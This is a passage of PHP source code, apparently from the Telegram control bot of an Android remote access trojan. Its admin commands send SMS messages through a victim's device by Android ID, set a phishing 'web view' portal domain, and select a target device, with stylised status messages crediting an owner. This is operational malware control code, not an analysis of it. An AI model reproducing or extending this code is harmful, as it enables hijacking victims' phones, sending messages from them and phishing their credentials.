    foreach ($str as $str1) {
        
  sendmess("SendSingleMessage",$androidid,$str1,$messs);
       
    
    } 
     file_put_contents("nump","");

	    
	
		
		}elseif($adminact=="setdom"){
			file_put_contents("url.txt",$text);
			
			sm($chat_id,"{🔗} ᴘᴏʀᴛᴀʟ ᴡᴇʙ ᴠɪᴇᴡ ʀᴀᴛ sᴇᴛᴇᴅ 

ʏᴏᴜʀ ᴅᴏᴍɪɴ ᴘᴏʀᴛᴀʟ $text {🔅}

{👨‍💻} ᴏᴡɴᴇʀ $crd 
",$starta);
file_put_contents("admins","");
	    
	    
	}elseif($adminact=="setuser"){
	    //strlen($text) == 16 and
	    if( strpos(file_get_contents("user.txt"),$text) !== false){
	        
	    file_put_contents("p",$text);
	sm($chat_id,"{〽️} ᴀɴᴅʀᴏɪᴅ ɪᴅ $text sᴇᴛᴇᴅ",$admins);
	     sm($chat_id,"{🎛} ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ ᴛᴀʀɢᴇᴛ

sᴇʟᴇᴄᴛ ʏᴏᴜʀ ʙᴏᴛᴛᴜɴ 🤓 {👇} 
 
{👨‍💻} ᴏᴡɴᴇʀ  $crd ",$admins);
	  
	     file_put_contents("admins","");
	    }else{
	        
	        
	            sm($chat_id,"{❎} ᴡᴏʀɴɢ ᴀɴᴅʀᴏɪᴅ ɪᴅ ",$starta);
	file_put_contents("admins","");
	
	        
	        
	            
  
	}
	
}

}


	       

  ?>
        
    






